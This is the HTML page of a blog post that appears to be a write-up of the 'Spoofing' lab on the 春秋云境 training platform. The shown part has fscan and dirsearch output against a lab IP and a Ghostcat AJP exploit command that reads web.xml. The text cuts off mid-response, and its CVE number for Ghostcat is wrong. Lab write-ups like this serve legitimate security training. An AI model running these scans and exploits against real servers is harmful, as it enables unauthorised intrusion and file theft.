@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="先来看一下考点  信息收集先fscan扫一下 12345678910111213141516fscan.exe -h 39.98.116.168   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#x27;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;&#x2F; &#x2F;_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境-Spoofing">
+<meta property="og:url" content="https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/index.html">
+<meta property="og:site_name" content="Ca1m">
+<meta property="og:description" content="先来看一下考点  信息收集先fscan扫一下 12345678910111213141516fscan.exe -h 39.98.116.168   ___                              _  &#x2F; _ \     ___  ___ _ __ __ _  ___| | __ &#x2F; &#x2F;_\&#x2F;____&#x2F; __|&#x2F; __| &#x27;__&#x2F; _&#96; |&#x2F; __| |&#x2F; &#x2F;&#x2F; &#x2F;_">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742952637279-d955c951-bc69-45b3-ace0-f9790b141746.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742952863608-1a0e725e-f006-42fc-94a0-15b87ebb21e9.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742953036071-d879f897-cb48-4c3c-b60b-8f26633c4bd5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965600238-fb7b31e5-87ef-4de4-b918-129cd9685caa.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965895380-498bdd49-6d11-4eff-9243-07ad18693a04.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742965992071-40a25aee-ac10-4ba1-917e-ada11192fe66.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742966440528-e934a2f9-feb1-4299-8c1a-b4684ea38ffe.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742967309061-7ecdeadd-a764-402c-9930-541645380e56.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742969105210-f28ac6b7-4fb4-41ea-abc2-f811a5529fb5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970056600-93cfa66d-9515-4626-8d14-e8adeeca44c5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970360182-aeb0962c-55ff-4f69-82f4-7eec881a43b2.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742970402986-b4bc86d5-ca24-48f3-8d67-7e5e54095e12.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742972622202-c878d395-6ead-4727-92bf-105cc0fe65c3.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742974674648-ea7a21e3-2de5-4d95-a8e3-3b92746bdc00.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742981422611-9816c06b-a2eb-4459-98d4-5e419eb47cf0.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742975249440-dd0c22cd-09df-42dd-b1a6-d29b8d74fab5.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742981924104-f66e75d8-f2f6-435a-813b-7a697be00090.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982092267-f2bd9dd7-caf2-4d72-b52d-52c41b41c2f4.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982227563-81ed6c8f-8bbb-4877-a88f-8ccc28c499eb.png">
+<meta property="og:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742982930827-52b533e0-697e-4020-a280-816898acfe3e.png">
+<meta property="article:published_time" content="2025-03-12T12:51:29.000Z">
+<meta property="article:modified_time" content="2025-03-26T10:42:01.708Z">
+<meta property="article:author" content="Ca1m">
+<meta property="article:tag" content="域">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742952637279-d955c951-bc69-45b3-ace0-f9790b141746.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云境-Spoofing</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/13/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Privilege/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/10/%E5%9F%9F/%E5%9B%9B%E7%A7%8D%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&text=春秋云境-Spoofing"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&title=春秋云境-Spoofing"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&is_video=false&description=春秋云境-Spoofing"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Spoofing&body=Check out this article: https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&title=春秋云境-Spoofing"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&title=春秋云境-Spoofing"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&title=春秋云境-Spoofing"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&title=春秋云境-Spoofing"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&name=春秋云境-Spoofing&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ca1msec.github.io/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/&t=春秋云境-Spoofing"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1983-Tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">CVE-2020-1983 Tomcat文件包含漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D"><span class="toc-number">4.</span> <span class="toc-text">永恒之蓝</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Relay-via-WebDAV-Petitpotam%E7%9A%84Coerce-Authentication"><span class="toc-number">5.</span> <span class="toc-text">Relay via WebDAV+Petitpotam的Coerce Authentication</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">6.</span> <span class="toc-text">基于资源的约束委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nopac"><span class="toc-number">7.</span> <span class="toc-text">nopac</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云境-Spoofing
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Ca1m</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-12T12:51:29.000Z" class="dt-published" itemprop="datePublished">2025-03-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/">内网攻防</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%9F%9F/" rel="tag">域</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>先来看一下考点</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742952637279-d955c951-bc69-45b3-ace0-f9790b141746.png"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先fscan扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.98.116.168</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.98.116.168:8080 open</span><br><span class="line">39.98.116.168:22 open</span><br><span class="line">39.98.116.168:8009 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">已完成 3/3</span><br><span class="line">[*] 扫描结束,耗时: 11.0582457s</span><br></pre></td></tr></table></figure>
+
+<p>发现8080和8009开着，先去看一下8080,发现是个后台</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742952863608-1a0e725e-f006-42fc-94a0-15b87ebb21e9.png"></p>
+<p>再扫一下后台目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://39.98.116.168:8080/</span><br><span class="line"></span><br><span class="line">Target: http://39.98.116.168:8080/</span><br><span class="line"></span><br><span class="line">[09:35:33] Starting:</span><br><span class="line">[09:35:33] 302 -    0B  - /js  -&gt;  /js/</span><br><span class="line">[09:35:40] 200 -  114B  - /404.html</span><br><span class="line">[09:35:40] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[09:35:41] 400 -  795B  - /a%5c.aspx</span><br><span class="line">[09:35:55] 200 -    7KB - /console.html</span><br><span class="line">[09:35:56] 302 -    0B  - /css  -&gt;  /css/</span><br><span class="line">[09:35:56] 302 -    0B  - /data  -&gt;  /data/</span><br><span class="line">[09:35:58] 302 -    0B  - /docs  -&gt;  /docs/</span><br><span class="line">[09:35:58] 404 -  732B  - /docs/CHANGELOG.html</span><br><span class="line">[09:35:58] 404 -  733B  - /docs/export-demo.xml</span><br><span class="line">[09:35:58] 404 -  729B  - /docs/_build/</span><br><span class="line">[09:35:58] 404 -  731B  - /docs/changelog.txt</span><br><span class="line">[09:35:58] 404 -  749B  - /docs/html/admin/ch01s04.html</span><br><span class="line">[09:35:58] 404 -  747B  - /docs/html/admin/index.html</span><br><span class="line">[09:35:58] 404 -  750B  - /docs/html/developer/ch02.html</span><br><span class="line">[09:35:58] 404 -  733B  - /docs/maintenance.txt</span><br><span class="line">[09:35:58] 404 -  730B  - /docs/swagger.json</span><br><span class="line">[09:35:58] 404 -  749B  - /docs/html/admin/ch03s07.html</span><br><span class="line">[09:35:58] 404 -  753B  - /docs/html/developer/ch03s15.html</span><br><span class="line">[09:35:58] 404 -  737B  - /docs/html/index.html</span><br><span class="line">[09:35:58] 200 -   17KB - /docs/</span><br><span class="line">[09:35:58] 404 -  746B  - /docs/html/admin/ch01.html</span><br><span class="line">[09:35:58] 404 -  730B  - /docs/updating.txt</span><br><span class="line">[09:35:58] 200 -  132B  - /download/</span><br><span class="line">[09:35:58] 302 -    0B  - /download  -&gt;  /download/</span><br><span class="line">[09:36:00] 302 -    0B  - /examples  -&gt;  /examples/</span><br><span class="line">[09:36:00] 404 -  781B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/</span><br><span class="line">[09:36:00] 200 -    1KB - /examples/</span><br><span class="line">[09:36:00] 200 -    6KB - /examples/servlets/index.html</span><br><span class="line">[09:36:00] 200 -   14KB - /examples/jsp/index.html</span><br><span class="line">[09:36:00] 200 -  658B  - /examples/servlets/servlet/CookieExample</span><br><span class="line">[09:36:00] 404 -  746B  - /examples/servlet/SnoopServlet</span><br><span class="line">[09:36:00] 200 -    1KB - /examples/websocket/index.xhtml</span><br><span class="line">[09:36:00] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample</span><br><span class="line">[09:36:01] 200 -  685B  - /examples/jsp/snp/snoop.jsp</span><br><span class="line">[09:36:03] 403 -    3KB - /host-manager/html</span><br><span class="line">[09:36:03] 403 -    3KB - /host-manager/</span><br><span class="line">[09:36:04] 302 -    0B  - /images  -&gt;  /images/</span><br><span class="line">[09:36:07] 302 -    0B  - /lib  -&gt;  /lib/</span><br><span class="line">[09:36:09] 302 -    0B  - /manager  -&gt;  /manager/</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&amp;att=HeapMemoryUsage</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/login</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?set=BEANNAME&amp;att=MYATTRIBUTE&amp;val=NEWVALUE</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/html/</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/admin.asp</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/login.asp</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/VERSION</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?invoke=BEANNAME&amp;op=METHODNAME&amp;ps=COMMASEPARATEDPARAMETERS</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&amp;op=findConnectors&amp;ps=</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/status/all</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/html</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?qry=STUFF</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?get=BEANNAME&amp;att=MYATTRIBUTE&amp;key=MYKEY</span><br><span class="line">[09:36:29] 403 -    0B  - /upload</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/1.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/2.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/loginIxje.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/test.txt</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/b_user.xls</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/b_user.csv</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/upload.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/test.php</span><br><span class="line">[09:36:29] 200 -    9KB - /user.html</span><br></pre></td></tr></table></figure>
+
+<p>版本号泄漏</p>
+<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742953036071-d879f897-cb48-4c3c-b60b-8f26633c4bd5.png"></p>
+<h2 id="CVE-2020-1983-Tomcat文件包含漏洞"><a href="#CVE-2020-1983-Tomcat文件包含漏洞" class="headerlink" title="CVE-2020-1983 Tomcat文件包含漏洞"></a>CVE-2020-1983 Tomcat文件包含漏洞</h2><p><a target="_blank" rel="noopener" href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.98.116.168:8080 8009  /WEB-INF/web.xml read</span><br><span class="line"></span><br><span class="line">       _    _         __ _                 _            </span><br><span class="line">      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ </span><br><span class="line">     //_\\ | | &#x27;_ \  \ \| &#x27;_ \ / _ \ / _ \| __/ _ \ &#x27;__|</span><br><span class="line">    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   </span><br><span class="line">    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   </span><br><span class="line">         |__/|_|                                        </span><br><span class="line">                                                00theway,just for test</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">[&lt;] 200 200</span><br><span class="line">[&lt;] Accept-Ranges: bytes</span><br><span class="line">[&lt;] ETag: W/&quot;2489-1670857638305&quot;</span><br><span class="line">[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT</span><br><span class="line">[&lt;] Content-Type: application/xml</span><br><span class="line">[&lt;] Content-Length: 2489</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="line"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class="line"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;security-constraint&gt;</span><br><span class="line">    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;</span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line">      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;</span><br><span class="line">      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line">      &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line">  &lt;/security-constraint&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/404.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;403&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/error.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span><br><span class="line">    &lt;location&gt;/error.html&lt;/location&gt;</span><br><span class="line">  